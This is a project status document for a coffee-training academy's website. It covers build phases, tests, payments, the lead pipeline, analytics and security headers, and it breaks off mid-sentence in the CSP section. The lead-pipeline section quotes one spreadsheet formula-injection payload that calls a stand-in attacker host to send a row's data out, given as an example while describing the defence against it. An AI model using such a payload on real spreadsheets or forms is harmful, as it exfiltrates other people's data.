# Status: Espresso Academy India website

**Review URL: <https://espresso-academy-india.vercel.app>** — public, no login. Open it on a phone.
Production serves the code `main` carries; the commits since touch CI and this document.

## Waiting on the client

Nothing here blocks a build or a deploy. Every one of them has a visible TBC state on the site
today, and the site fills itself in the moment the value lands — no code change. They are ordered
by what they cost while they are missing.

1. **A verified sending domain in Resend, and `RESEND_FROM_EMAIL`.** The only item on this list
   that is costing something right now: **a student who pays gets no confirmation email.** Mail
   goes from `onboarding@resend.dev`, which Resend delivers only to the Resend account owner, so
   the academy's copy of a booking arrives and the student's does not. Nothing in this repository
   can fix it. See "Accounts and keys" in `docs/launch-checklist.md`.
2. **Fees incl. GST, for all 8 courses.** Until then the course pages say the fee is confirmed on
   WhatsApp before payment, and no course can be booked online.
3. **Batch dates and seat counts.** Same consequence: no dates means nothing to book, and the
   calendar shows its being-finalised state.
4. **Duration, format, syllabus, what the fee includes, EMI, prerequisites** for each course.
5. **Which trainer teaches which course**, and each trainer's role and philosophy quote.
6. **Photographs** for every slot in `docs/images-manifest.md`. Nothing has arrived, so every
   frame is a branded placeholder naming its slot.
7. **WhatsApp number, public email address, opening hours, reply-promise wording.**
8. **Legal copy**: privacy, terms, refund and reschedule policy. All three are placeholder text.
9. **Testimonials with written permission.** The stories section stays empty until then, and the
   query enforces it.
10. **Logo as SVG, ideally a horizontal lockup**, and sign-off on the header composition.
11. **Written permission for the "Official Partner" wording**, the correct "Forest Green" hex, the
    correct plot number and map pin, and confirmation of the SCA campus status.
12. **Whether the brochure's "17 branches", "Berry Co" and "Coorg planters" claims are current.**
    None is used anywhere until it is confirmed.

The detailed table, with the exact field behind each row, is under "Needs client" further down.
`node scripts/stale-content.mjs` prints the same list live from Sanity, so it cannot go stale.

## What a developer still has to do

Nothing is half-finished. What is left needs an account or a decision from the academy first:
the Resend domain above, a Google Sheets service account for the lead mirror (optional), the Meta
Pixel and Conversions API keys (both wired, both dormant), Cal.com if cafe enquiries should book a
call, and the remaining six SEO guides, two of which are seeded as working templates.

---

A note on why that is the alias and not a `-git-`/hash preview URL: previews on this Vercel team
are protected by Vercel Authentication, so a preview link asks the client to log in to Vercel
before it will render. The alias above is public and stable across redeploys, which is what a
client review needs. Turning preview protection off is a setting on the whole team, so it is left
alone: **Project Settings, Deployment Protection** if you would rather share a per-deployment
preview link, or use the dashboard's "Share" button on a deployment for a 23-hour bypass link.

---

## Done

### Phase 0: scaffold

- Next.js 16.3.4 (App Router, Turbopack), React 19.2.8, TypeScript strict, Tailwind v4.3.3, pnpm.
- shadcn/ui on the Base UI base: `button`, `sheet`, `dialog`, `accordion`, `select`, `input`,
  `textarea`, `checkbox`, `label` in `src/components/ui/`. Regenerate with the CLI; never edit by hand.
- Brand tokens from `design/tokens.css` pasted verbatim into `src/app/globals.css`, plus
  `.container-site`, `.section-y`, `.eyebrow`, `.hairline`, `.dark-wash`, `.hero-gradient-text`
  and the `.type-*` scale utilities. Every shadcn semantic colour is aliased onto a brand token,
  so a primitive cannot introduce an off-brand colour.
- Fonts self-hosted from `@fontsource-variable/montserrat` and `@fontsource/bebas-neue` through
  `next/font/local` (`src/lib/fonts.ts`). No `next/font/google`, no runtime request to Google.
- Content layer: `src/lib/content.ts` (typed accessors), `src/lib/format.ts` (fee, duration,
  date in Asia/Kolkata, WhatsApp URL builder), `src/lib/env.ts` (zod, every variable optional).
- `tests/routes.json` lists all 26 indexable routes plus the non-indexed component gallery.
- ESLint with the full `jsx-a11y` recommended set raised to error; Prettier with the Tailwind
  class sorter.

### Phase 1: foundation components

- `src/components/site/`, `course/`, `sections/` and `forms/` built, with a gallery at
  `/dev/components` (noindex) rendering every component in its default, empty, loading, error and
  TBC states.
- Design review run at 390 and 1280. Screenshots in `docs/screens/`. Score before fixes: 5/10.
  Every critical and high finding is fixed:
  - **The class merger was deleting colour classes.** `cn` read this project's `text-body` and
    `text-small` tokens as colours, so it dropped the `text-white` next to them: every WhatsApp
    button rendered black-on-black (1:1) and every red pill black-on-red (2.47:1). Fixed in
    `src/lib/cn.ts` by registering the custom theme scales, and aliased in `next.config.ts` so the
    shadcn primitives get the corrected merger without being hand-edited.
  - **237px of horizontal overflow at 390** from the three-rung level ladder. It now stacks below md.
  - **Tables pushed the document 209px wide at 390.** The screen-reader-only text inside them is
    absolutely positioned and escaped the scroll container. New `.table-scroll` utility.
  - Focus ring was invisible on the black grounds (blue on black is 1.26:1); it is white there now.
  - `outline-none` on the waitlist inputs removed the focus ring entirely.
  - Footer TBC pills rendered white-on-white-2; footer links were 18px tall, now 44px.
  - The sticky bar covered the footer legal row.
  - Bebas numerals were rendering at 20px, below the 24px floor.
  - Disabled primary buttons read as a selected chip; they are now grey.
- Verified: no route overflows at 390 (`node scripts/check-overflow.mjs`).

### Phase 2: layout, home, error pages

- Root layout: skip link, header, main, footer, sticky bar, consent banner, site-wide
  `EducationalOrganization` + `LocalBusiness` + `WebSite` JSON-LD, metadata defaults, `#FEFCFF`
  theme colour.
- Homepage in the specified order, with the red gradient used on the H1 and nowhere else.
- `not-found.tsx`, `error.tsx` and `/thank-you` (noindex), all three linking to the courses and
  to WhatsApp.

### Phase 3: courses hub, course pages, calendar

- `/courses` with server-rendered `?level=` and `?area=` filtering, canonical always `/courses`.
- `/courses/[slug]` for all 8 courses, each with `Course` + `BreadcrumbList` + `FAQPage` JSON-LD
  and its own Open Graph image route.
- `/calendar`, which currently renders the "dates being finalised" state with a per-course batch
  alert, because no instance in `content/data.ts` carries a date.

### Phase 4: the remaining pages

- `/certifications` and `/certifications/[slug]`, `/trainers` and `/trainers/[slug]`, `/about`,
  `/faq`, `/contact`, `/enquire`, `/thank-you`, `/privacy`, `/terms`, `/refund-policy`.
- `/api/enquiry`: zod validation, honeypot and a two-second timing floor both dropped silently with
  a 200 so a bot learns nothing, Resend when both env vars exist, and the pre-filled WhatsApp
  handoff otherwise. It never throws at the reader.
- `sitemap.ts`, `robots.ts` (AI crawlers allowed; `/api`, `/dev` and `/thank-you` held back),
  `/llms.txt`, a default Open Graph card and one per course.

### Content pass

The content-editor subagent audited every page's copy against `content/facts.md`. Applied:

- **A factual error:** the SCA Coffee Skills Program was described as six modules. `facts.md` says
  five.
- "the Official Partner" implied exclusivity; `facts.md` explicitly records a second Indian partner
  in New Delhi. Now "an Official Partner" everywhere, and the About page says so in prose.
- "SCA-certified"-adjacent phrasing removed: the SCA offering is described only as "training
  aligned to the SCA Coffee Skills Program", and no claim is made about who runs an assessment,
  since trainer AST status is unconfirmed.
- Equipment claims ("professional machines", "the same machines as the professional courses")
  removed: no equipment fact exists and the About page marks the machine list TBC.
- Claims about entry requirements, session format and employer recognition softened to what the
  data supports, or moved to a TBC state.
- Service promises that implied a fee or a date already exists ("the academy replies with the fee
  incl. GST, the next batch date") rewritten.
- Diplomas are "issued" in Italy, not "printed"; sent to "partner schools", not "the campus".
  Q Processing is "CQI Q Processing". The IBC carries "(IBC)" on first use.
- The empty stories section no longer promises outcomes ("Where our students end up" ->
  "Student stories").
- `/llms.txt` gained explicit guardrails so an assistant quoting it cannot state a fee, a date, an
  SCA certification claim or an exclusivity claim.

### Phase 5: SEO

- `sitemap.ts` and `robots.ts` generated from `content/data.ts`; robots allows the AI crawlers and
  holds back `/api`, `/dev` and `/thank-you`. `/llms.txt` route.
- Open Graph image routes: a default card plus one per course.
- Titles are set absolutely so the homepage cannot lose its suffix, and every one is checked
  against the 50 to 60 character band by the test suite.
- Structured data is asserted per route by the test suite rather than by eye: `@graph` parses, the
  organisation and campus nodes are present everywhere, and `BreadcrumbList` appears on exactly
  the pages that render a visible trail.

### Phase 6: tests

`pnpm test:e2e` runs 932 tests across chromium, webkit, Pixel 7, iPhone 14, iPad Mini and Laptop 1024, all
passing. The iPad Mini project exists because 768 is the middle width `design.md` names and nothing
was covering it: a design review found a crushed header and a 17px document overflow living there
while 390 and 1280 had been clean the whole time.

- Every route returns 200, has exactly one H1, skips no heading level, and has no horizontal
  overflow at any of the five viewports.
- Sticky bar present everywhere except `/enquire` and `/thank-you`, hidden until 300px of scroll.
- The mobile sheet opens, traps focus, closes on Escape and restores focus to its trigger.
- `?level=` and `?area=` filter the hub while the canonical stays `/courses`.
- "Reserve a seat" pre-fills `/enquire`.
- The enquiry form: invalid phone shows an error and moves focus; a mocked success replaces the
  form; a mocked failure shows the WhatsApp handoff. The API rejects a bad phone, drops the
  honeypot and sub-2-second submissions silently, and refuses non-POST.
- axe (WCAG 2.0/2.1/2.2 A and AA) on every route with no serious or critical violations, plus the
  open mobile sheet.
- Guards that no page states a fee, a rating, a student count, an "SCA-certified course" or an
  India-first superlative.

Three real defects the suite caught and that are now fixed: the "+91" field prefix was grey on
white-2 at 4.05:1; the level ladder was `aria-hidden` while containing links; and the inline error
message appearing on blur shifted the fields below it, moving the consent checkbox out from under
a tap.

### Phase 7: accessibility

- axe (WCAG 2.0/2.1/2.2, A and AA) is clean on all 27 routes and on the open mobile sheet; it runs
  in the test suite, so it cannot regress silently.
- Lighthouse Accessibility is 100 on every route measured.
- `node scripts/check-brand-contrast.mjs` walks every route and asserts the two pairs design.md
  forbids outright but which pass generic contrast checks: red or red-deep text on the black
  grounds, and mustard as a text colour. Clean on all 27 routes.
- `node scripts/check-target-size.mjs` walks every route and asserts the 44px target rule, which is
  stricter than the 24px WCAG 2.2 floor that axe enforces. Four design-review rounds each found
  more links between those two numbers, so it is a script now rather than a thing to keep spotting.
  An input is measured together with the label that toggles it, which is the real target.
- Keyboard: the skip link is the first focusable element and jumps to `#main`; the sheet traps
  focus, closes on Escape and restores focus to its trigger; the enquiry form moves focus to the
  first invalid field. All asserted in the suite.
- `prefers-reduced-motion` is asserted to leave no transition or animation over 50ms anywhere.
- Fixed in this pass: the "+91" field prefix was grey on white-2 at 4.05:1; the focus ring was
  invisible on the black grounds (blue on black is 1.26:1) and is now white there; the level ladder
  was `aria-hidden` while containing links; footer links were 18px tall; the consent checkbox was
  20px against the 24px WCAG 2.2 minimum; and an error appearing on blur shifted the field below it.
- A fixed bottom bar can land on top of a control the browser has just scrolled to, so form
  controls carry `scroll-margin-bottom` below the md breakpoint.

### Phase 8: performance

Full numbers and the reasoning in `docs/audits/perf-draft.md`. Lighthouse mobile against
`pnpm build && pnpm start`:

| Route | Perf | A11y | Best Practices | SEO | LCP | CLS | TBT |
|---|---|---|---|---|---|---|---|
| `/` | 99 | 100 | 100 | 100 | 2.1s | 0 | 0ms |
| `/courses` | 92 | 100 | 100 | 100 | 3.4s | 0 | 0ms |
| `/courses/sca-barista-skills-foundation` | 92 | 100 | 100 | 100 | 3.4s | 0 | 0ms |
| `/enquire` | 93 | 100 | 100 | 100 | 3.2s | 0 | 0ms |

Four real defects found and fixed: zod was shipping to the browser (about 50KB gz on every page);
`/enquire` had a 0.238 layout shift from a Suspense fallback swapping the form in; the consent
banner was the Largest Contentful Paint on course pages at 2.4s; and a missing favicon was the only
thing holding Best Practices at 96.

### Phase 8b: de-template

Five design-review rounds on `/`, `/courses`, a course page and `/about`, the last three at 390,
768 and 1280. Screenshots in `docs/screens/`. Round one scored 8 / 6.5 / 7 / 7.

The defects that mattered, in the order they were found:

- **The level filter rendered two chips both reading "All levels"**, the reset and the `open` level.
  The level is "Open level" now.
- **"Which one is yours" on `/courses` was `AudienceDoors` a second time**, one section below
  another equal-column grid: the clearest template tell on the site. The master prompt requires
  that guidance, so the content stayed and the composition became a 4/8 split with numbered rows.
- **`/courses` and `/about` opened on desktop with half the viewport blank**: neither passed an
  `aside` to `PageHero`, so the 7/5 grid was never built.
- **The consent banner covered the mobile sticky bar**, hiding WhatsApp, Call and Reserve on every
  page. My own regression, from moving the banner flush to the bottom. Both now read one store and
  the bar waits for the choice. A test asserts it.
- **Every FAQ question rendered at 14px**, smaller than its own 16px answer, on three pages. Same
  class of bug as the original class-merge failure, one level deeper: `type-h3` is an `@utility`,
  which the merger cannot classify as a font size at all, so it and shadcn's `text-sm` both
  survived and CSS order decided.
- **At 768 the header collapsed.** The six nav items plus two actions starved the brand link, which
  carried `shrink`: the mark squashed to 5px wide against its own 682:1000 ratio and the wordmark
  wrapped to three lines printed over the "Courses" nav link. The nav moves to `lg`.
- **At 768 the level ladder pushed the document 17px wide**, the same `min-width: auto` cause
  already fixed on the fee table and not swept into the component.

Both 768 defects existed because nothing tested 768, so 768 was added to
`scripts/check-overflow.mjs` and an iPad Mini project to the Playwright suite. That turned out to
be the first instance of a pattern, not the end of one.

**Rounds six to eight cleared the gate: 8.5 / 8.0 / 8.5 / 8.0 on `/`, `/courses`, a course page
and `/about`.** Round five re-ran from scratch and scored 6.5 / 6.0 / 6.0 / 6.5, because rounds one
to four had fixed symptoms while the cause went untouched: **every desktop grid fired at `md`
(768), where there is not enough width for twelve columns.** Left columns were 200px, the footer
was five 91px columns, the hero aside was a 265px box floating beside a 650px column, and the
level-ladder badges rendered 29 to 32px outside their own cards with the last one flush to the
viewport edge. That last one is why `check-overflow.mjs` never saw it: the badge escaped its
*card*, not the *document*.

Moving the twelve-column grids to `lg` fixed the badge overflow at its root, with no change to
`LevelLadder` itself. What the following rounds then found, each one a consequence of the last:

- **At exactly 1024 the header was 2px wider than the viewport** on every route, clipping the
  Enquire pill and eating the 32px right gutter. `lg` *is* 1024, and the header needs 1064.
  There is now a `--breakpoint-nav: 1080px` token, measured rather than guessed.
- **Between 768 and 1023 the site had no visible primary call to action at all** — the sticky bar
  stops at `md`, and the earlier "guard at 768" had moved the header's Enquire pill to `lg`. On a
  64%-mobile site that was the most commercially costly defect of the whole pass.
- **At 360 the brand lockup pushed every route 9px sideways.** 375 and 390 were both clean, which
  is exactly why it survived eight rounds.
- **The skip link had no padding.** Tailwind's `not-sr-only` sets `padding: 0` and was beating the
  base `px-4 py-3`, so the first thing any keyboard user met was a 170x26 unpadded slab.
- **The certificate cell asserted a claim `facts.md` forbids.** It read `Certificate: SCA`, and
  facts.md line 45 lists "SCA-certified courses" among the phrases the site must never use. It is
  driven by the certification's own `status` field now: `Programme: SCA`, `Certificate: IBC`.
- **`/courses` section 04 was eight rows of sixteen identical TBC pills**, restating course titles
  and level badges the card grid above already showed, to prove the point its own description made
  in one sentence. It renders a real empty state until one fee or duration lands.
- **TBC was the loudest thing on a course page**: four pills in the spec strip above the fold and a
  `Fee: TBC / Next batch: TBC` row pinned to the bottom of the viewport for the whole scroll. Both
  now collapse while every value is null, which is what `CourseCard` already did.
- Three trainer cards ended 21px apart wherever a credential wrapped; `TrainerCard` was missing the
  `h-full` + `mt-auto` pair `CourseCard` already had.

The recurring lesson is the same one 768 taught, twice more: **defects live at the widths nobody
listed.** 1024 broke because it is where a breakpoint switches on, and 360 broke because the list
started at 390. `check-overflow.mjs` now runs at 360, 390, 768, 1024 and 1280, and the Playwright
suite has a Laptop 1024 project beside the iPad Mini one.

### Phase 9: deploy

- Deployed to Vercel under `social-hippi/espresso-academy-india`, serving `cc5c0f0`.
- Canonicals, Open Graph images and JSON-LD `@id`s fall back to `NEXT_PUBLIC_VERCEL_URL`, so a
  preview describes itself rather than claiming production's URL.
- `.vercelignore` holds back `.env*.local`, which pins `NEXT_PUBLIC_SITE_URL` to localhost and now
  also carries a `VERCEL_OIDC_TOKEN`. Uploading it would point every canonical at a dev machine.
- The `qa-runner` pass ran before deploying: typecheck, lint, build, 932 tests and the three
  standing scripts all green; Lighthouse mobile Accessibility 100, Best Practices 100, SEO 100,
  CLS 0 on all four measured routes.
- Verified against the deployment itself, not just localhost: every route 200, no horizontal
  overflow at **360, 390, 768, 1024 or 1280**, no forbidden colour pair, every standalone tap
  target at least 44px. Client screenshots re-taken from this build into `docs/screens/preview-*.png`.


---

## Build 2

Turning the reviewed draft into the product: Sanity for content and operations, Razorpay for
payment, a lead pipeline that writes to more than one place, analytics, and the security and CI to
carry it. Content stays parked; every TBC state is untouched. Plan: `docs/plans/build-2.md`.

### Phase 0: housekeeping — done

- Working tree clean, `HEAD` at `789328d`, which is what the public alias serves. `789328d` changed
  only `docs/`, so the deployed code is `af3011d`'s, the same code `main` carries. Nothing stale is
  public and no redeploy was needed to make that true.
- **`X-Robots-Tag: noindex, nofollow` was specified but had never been wired.** `NEXT_PUBLIC_INDEXABLE`
  existed in `.env.local` and was read by nothing, so the public review alias was fully crawlable.
  It is now read in two places: `next.config.ts` sends the header on every response, and
  while the variable is anything but `"true"`. robots.txt is the same before and after launch.
  Verified against a production build on `/`, `/courses` and `/sitemap.xml`.
- `CLAUDE.md` "Stack" now names every integration and what each one degrades to. Non-negotiable 11
  (the server reads the fee from Sanity; the browser is never trusted for an amount) and 12 (every
  webhook is signature-verified and idempotent) added.
- `docs/plans/build-2.md` written: data model, API surface, env matrix, test plan, order of work.

Gate: typecheck, lint and build clean; `pnpm test:e2e` 932 passing.

### Phase 1: Sanity — done

Project `msmxj36z`, dataset `production`, **private**. Studio at
[espresso-academy-india.sanity.studio](https://espresso-academy-india.sanity.studio) and, embedded,
at `/studio` on the site.

- **The dataset is private, not public.** Bookings and enquiries hold names, phone numbers and
  email addresses, and they live in the same dataset as the content because a booking references a
  batch. A public dataset would let anyone with the project id read them. Every read therefore
  carries a token, including published content; the token is server-side only and never reaches
  the browser.
- Fourteen document types in `sanity/schemaTypes/`, mapping 1:1 to `content/data.ts` plus `venue`,
  `guide`, `page`, `landingPage`, `redirect`, `booking` and `enquiry`.
- `seatsAvailable` is derived in GROQ (`seatsMax - seatsBooked`), never stored. `seatsBooked` is
  read-only in the Studio and maintained by the payment webhook. A `booking` is read-only except
  for `status` and `notes`: it mirrors something that happened at a payment gateway, and an editor
  changing an amount after the fact would make the two disagree with no way to tell which is right.
- Studio structure built around the two questions the academy opens it to answer: what is running
  when, and who has paid. **Every batch has a roster view** listing its paid bookings and its
  waitlist enquiries.
- `sanity/seed/from-data.ts` created 31 documents from `content/data.ts` in one transaction, with
  deterministic ids so re-running it is safe. Every null stayed null: no TBC was filled in.
- `src/lib/content.ts` reads GROQ and returns the same shapes, so no component changed with the
  data source. Fetches are tagged; `/api/revalidate` turns a signed Sanity publish into
  `revalidateTag`, with a one-hour floor underneath in case the webhook is ever wrong. The webhook
  is created and points at `https://espresso-academy-india.vercel.app/api/revalidate`.
- `src/lib/sanity/image.ts` plus a `SanityPhoto` component: Sanity's CDN does the transform
  (`auto=format` gives AVIF or WebP), with its LQIP as the blur placeholder. The branded
  placeholder branch is unchanged, so a missing photograph still prints its slot name.
- Redirect documents are read by `next.config.ts` at build time. A failure there is logged, not
  fatal: a site that will not build because a CMS was briefly unreachable is the worse outcome.

**Parity evidence:** the 932-test Playwright suite passes unchanged against the Sanity-backed
build, and the three standing scripts are clean at 360, 390, 768, 1024 and 1280.

Two build failures worth recording, both Turbopack export-condition problems rather than bugs in
this code: the Studio pulled `sanity` into the Server Components graph, where `swr`'s
`react-server` build has no default export (fixed by putting the Studio config behind a client
boundary, which is where a single-page application belongs); and `@sanity/icons` v5 exports only
`Icon` and `icons` from its root, so each icon is imported from its own subpath.

### Phase 2: booking and payments — done

**A student can pay for a seat.** Verified end to end in Razorpay test mode with a real ₹1 payment
on a domestic test card: order created, Checkout.js opened, 3DS OTP passed, webhook captured, seat
taken, confirmation page rendered. Screenshots in `docs/screens/razorpay-*.png` and
`booking-confirmed-390.png`.

- `/book/[instanceId]`, `/api/orders`, `/api/payments/verify`, `/api/webhooks/razorpay`,
  `/api/bookings/[id]/status`, `/booking/[bookingId]` and its `calendar.ics`.
- **The amount is never read from the browser.** `/api/orders` takes only the batch id, re-reads the
  batch from Sanity with the write token and no CDN, and computes the amount itself. A test posts
  `amount`, `amountInPaise` and `feeInclGst` in the body and asserts the order is still for the
  seeded fee.
- **Paying and taking a seat happen exactly once**, inside one Sanity transaction guarded by the
  batch's revision id, retried on conflict. The webhook and the browser's verify call race, and
  Razorpay retries anything that is not 2xx, so a second delivery is the ordinary case: it answers
  200 and changes nothing.
- **Overbooking is recorded, not refused.** If the increment would pass `seatsMax` the booking is
  still marked paid, flagged `overbooked` and emailed to the academy, with its own list in the
  Studio. Taking money and having no record of it is the worse failure.
- The gateway is behind `src/lib/payments/provider.ts`. See the rate-card note below.
- `/refund-policy` renders `siteSettings.refundPolicy` when the academy writes it, and falls back to
  the marked placeholder until then. The checkout links to it before anyone pays.

**Two defects found by testing the checkout by hand, both invisible until tapped:**

1. **Every WhatsApp link on the mobile sticky bar had no recipient** — `https://wa.me/?text=…`. The
   number moved from a module constant to a Sanity field in Phase 1 and the sticky bar was never
   passed it. The same bug was in the enquiry form's fallback and in `/api/enquiry`'s handoff. On a
   64%-mobile site that is the most-tapped control on the page. There is now an assertion per route
   that no rendered `wa.me` link is missing its number.
2. **The order rate limit was six a minute per address.** Indian carriers put very large numbers of
   subscribers behind one CGNAT address, so at peak that would have turned away real customers. It
   is thirty now; the honeypot, the two-second floor and Turnstile are what actually stop a bot.

**Rate card, for the client's decision:** Razorpay charges 2% + GST. Cashfree is running a 0%
domestic promotion to March 2027 and PhonePe PG a promotional 0%. The recommendation is to launch on
Razorpay, which is live and tested, and evaluate Cashfree as a second gateway once the volumes are
real: at ₹25,000 a seat, 2% is ₹500 a booking. The adapter exists so that decision costs one file
rather than four route handlers.

Tests: 30 unit tests on both signatures (against hand-computed vectors, not the implementation), the
fee arithmetic and every branch of the book/waitlist/enquire rule; a `booking` Playwright project
running serially for the stateful payment path; `tests/global-setup.ts` resets the seeded batches
before every run.

Gate: typecheck, lint and build clean; **1194 e2e tests passing, 0 failing**.

`docs/RUNBOOK.md` is now the operational runbook. Build 1's operator guide moved to
`docs/kit-setup.md`.

### Phase 3: lead pipeline — done

**Sanity is written first and the response depends only on that write.** Build 1 sent an email and
nothing else, so a Resend outage was a lost customer, and a lead that reached nobody returned the
same 200 as one that reached the academy.

The fan-out afterwards runs in parallel with retries and every part of it is allowed to fail: the
academy's email (reply-to the student), an auto-reply, a Google Sheets row, and a Meta CAPI `Lead`
sharing an `event_id` with the browser's `generate_lead` so the pair is counted once.

- **Three variants.** Student; waitlist, linked to the batch document so the person appears on that
  batch's roster in the Studio; cafe, routed to `CAFE_TO_EMAIL` with a Cal.com slot on the
  thank-you page when `NEXT_PUBLIC_CALCOM_LINK` is set, and "the academy will call you" when it is
  not.
- **Formula injection is defended twice**, because either defence alone is one config change from
  being wrong: a leading apostrophe on anything starting `=`, `+`, `-` or `@`, and `RAW` rather than
  `USER_ENTERED` on the append. `=IMPORTXML("http://attacker/"&A1)` typed into a name field
  exfiltrates the whole row, and the academy just sees a name.
- Google Sheets goes through the REST API with a hand-signed service-account JWT, not `googleapis`
  (about 20MB installed, to make one call).
- **The auto-reply promises nothing the academy has not confirmed.** Without
  `siteSettings.replyPromise` it says the academy replies during hours and states no interval:
  inventing a service level is the same class of error as inventing a price.
- The enquiry form gains an **optional** email field and Turnstile. Optional on purpose: a phone
  number is enough to have a conversation, and requiring an email costs leads on this audience.

Two things fixed while testing: the fan-out logged "sent" and "mirrored" when a destination was
simply not configured, which is how a misconfiguration survives a month; and the enquiry rate limit
was 20/min per IP, the one defence here that can hurt a real customer, because Indian carriers put
very large numbers of subscribers behind one CGNAT address.

Gate: typecheck, lint and build clean; **1215 e2e tests passing, 0 failing**, including nine
pipeline tests against real Sanity that assert the document exists with its course reference, its
batch link and its campaign; that a honeypot and a too-fast submit create nothing; and that a lead
survives both optional destinations being absent — not mocked, because this environment genuinely
has neither.

### Phase 4: remaining pages and templates — done

Six routes, and a section library the academy can build a page from without a developer.

| Route | What it is |
|---|---|
| `/workshops` | Calendar-first. A workshop is a course with `isWorkshop` ticked, not a new type. |
| `/calendar` | Course and venue filters, seats left, Book/Waitlist/Enquire per row, Event JSON-LD. |
| `/for-cafes` | From a `page` document, with a hand-written fallback of the same shape until one exists. |
| `/guides`, `/guides/[slug]` | Answer-first, question H2s, evidence table, FAQ block, Article + FAQPage. |
| `/lp/[slug]` | Campaign page. Always noindex, logo and phone only. |
| `/student-stories` | Empty until a story has written permission, and that is enforced in the query. |

- **The calendar's facets are built from the batches that exist**, so no chip leads to an empty
  list, and the venue strip stays hidden while there is one campus. Counts describe the whole
  calendar rather than the current view. The canonical stays `/calendar` and the Event JSON-LD
  describes the unfiltered page, so a facet never competes with the page it filters.
- **A guide names its author, names its reviewer and carries both dates.** That is the difference
  between an answer and a claim, and it is what lets a search result or an assistant quote it.
- **`/lp/*` keeps the landmark rules** without moving every route into a `(site)` route group:
  `SiteChrome` gates the site header and footer off, so a campaign page has exactly one `header`,
  one `main`, one `h1` and no `nav`.
- **Nothing seeded states a fact.** `pnpm sanity:seed:templates` creates two guides, the for-cafes
  page and one landing page, every body paragraph marked `PLACEHOLDER`, and no fee, date, duration
  or SCA claim anywhere in them. The four real values in the landing page's proof section all trace
  to `content/facts.md`.

**Five defects found and fixed, four of them by the standing scripts:**

1. **`/courses/latte-art` went 19px wide at 360 the moment a batch first had a date.** A grid item
   defaults to `min-width: auto`, so it cannot shrink below its content and the scroll container
   inside it never got to scroll. This is the third instance of that root cause in this codebase;
   `.table-scroll` is defensive now as well as the wrapper.
2. **Seven tap targets under 44px** on `/calendar` and both guides.
3. **A `<dl>` on `/book` and `/booking` had an icon `<span>` as a direct child** of the dt/dd group,
   which axe reports as a serious `definition-list` failure. The icon lives inside the `<dt>` now.
4. **`check-brand-contrast` and `check-target-size` waited for `networkidle`**, which never settles
   on a page carrying Turnstile, so `/for-cafes` hung until they timed out. Both wait for `load` and
   the fonts now. Playwright deprecates `networkidle` for exactly this reason.
5. **The seat increment committed to Sanity with `visibility: "async"`**, which returns before the
   change is queryable, so the next `/api/orders` read could still see the last seat as free and
   sell it twice. A few hundred milliseconds is exactly long enough for the second person clicking
   Book on a nearly-full batch. It commits synchronously now.

The calendar test asserted the empty state, so it failed the day a batch first got a date — the day
it should have been most useful. It branches on the data now and asserts whichever state it finds
is complete.

Gate: typecheck, lint and build clean; **1461 e2e tests passing, 0 failing**; the three standing
scripts clean at 360, 390, 768, 1024 and 1280.

### Phase 5: analytics — done

`src/lib/analytics/events.ts` is the whole vocabulary: twenty typed events and one `track()`, so a
mis-spelled event name is a build error rather than a gap in a report nobody notices for a month.
Setup steps and the event table are in `docs/analytics-setup.md`; the container is
`docs/gtm-container.json` (21 tags, 19 triggers, 19 variables), generated rather than hand-written
so a trigger name cannot drift from the event it listens for.

**Two gates, and both have to open before anything third-party loads.** Consent mode v2 defaults
every storage type to `denied`, inline in the document head so it executes before GTM can — a
module import would run after the parser reached the GTM tag, and the container would fire once
unconsented and again after the update, which is the exact double-count consent mode exists to
prevent. Then, even after consent, the loader waits for idle or the first scroll or tap: GTM plus
GA4 plus the pixel is about 120KB, and on this audience letting that compete with the hero costs a
real second of LCP.

India is not covered by the EU rules that make any of this mandatory. Defaulting to denied is a
choice: a student handing over a phone number deserves the same treatment as a reader in Berlin.

- **Every `data-event` attribute the site already carried is now read**, by one delegated listener
  in `ClickTracker`. Build 1 put them on every call to action and left them unread, which was
  right: the alternative was an `onClick` per button, and that makes every button a Client
  Component. Adding a tracked control is still just adding an attribute.
- **The Meta Pixel is loaded by the application, not by a GTM tag.** The browser event and the
  server-side Conversions API call must share an `event_id` or Meta counts the conversion twice,
  and that id is generated here. Through a container, the academy could break the pairing by
  editing a tag, and the two halves of one contract would live in two systems.
- `purchase` fires once per booking per session, guarded by `sessionStorage`: the confirmation URL
  is bookmarkable and every reload would otherwise report another sale.
- The two Google Ads tags are **paused placeholders**. The academy has no Ads account; a conversion
  tag carrying somebody else's ID is worse than no tag.

Eight journey tests assert the funnel as a *sequence*, not as a pile: `generate_lead` has to come
after `form_submit`, carry the course, and carry an `event_id`; a rejected form reports `form_error`
and no lead; a refused order reports `booking_failed` and never `purchase`; and nothing from Google
or Meta loads before the banner is answered.

Three test flakes found and fixed, all the same root cause and worth naming: **every assertion on
an effect-driven push has to poll.** `page_view`, `form_start`, `consent_update` and the delegated
click listener are all pushed from a React effect, and `page.goto` resolves on load, which is
earlier than hydration. Reading once passed on Chromium and failed intermittently on WebKit and
iPad Mini. `mouse.wheel` also does not exist in mobile WebKit, which matters here because the phone
projects are two thirds of the audience.

Gate: typecheck, lint and build clean; **1509 e2e tests passing, 0 failing**.

### Phase 6: security — done

Content Security Policy in `src/middleware.ts`, plus `nosniff`, `strict-origin-when-cross-origin`,
`X-Frame-Options: DENY`, a permissions policy that denies camera, microphone, geolocation, payment
and the topics APIs, and HSTS commented out until launch. 26 tests assert all of it.

**The CSP is split by what a route handles, and that is a considered trade rather than a shortcut.**
A statically generated page's HTML is written once at build time and cannot carry a per-request
nonce; `strict-dynamic` makes a browser ignore `'self'` for inline code, so Next's own flight
payload is blocked without one. The choice is therefore: every page dynamic and nonced, or the
content pages keep `unsafe-inline`.

- **Routes that take personal data** — `/enquire`, `/contact`, `/book`, `/booking`, `/for-cafes`,
  `/lp`, `/api` — render per request and get nonce + `strict-dynamic`, no `unsafe-*` at all.
  `/for-cafes` and `/lp` were made dynamic for this; they are the two pages with a form that were
  otherwise static.
- **Pages that only display content** stay static and keep `unsafe-inline` for the framework's
  inline scripts, with `strict-dynamic` deliberately absent (the two cancel out) so the host
  allow-list does the work. Those pages render no user-controlled HTML: everything from Sanity goes
  through React's escaping, and the only `dangerouslySetInnerHTML` on the site holds two
  compile-time constants.
- **The Studio gets its own policy**, with `unsafe-eval` — it compiles schemas in the browser — and
  a test asserts that no public page has it.

`scripts/check-csp.mjs` loads every kind of page with consent granted and fails on any console CSP
violation. That is the check that earned its place: a header assertion says the policy is present,
and this says the policy does not break the site. It found four real problems a header test could
not:

1. **`strict-dynamic` and `unsafe-inline` cannot coexist.** The Studio's policy read as though it
   allowed its inline scripts and blocked all forty of them.
2. **A hash nullifies `unsafe-inline`.** Adding the consent-snippet hash to the content policy "for
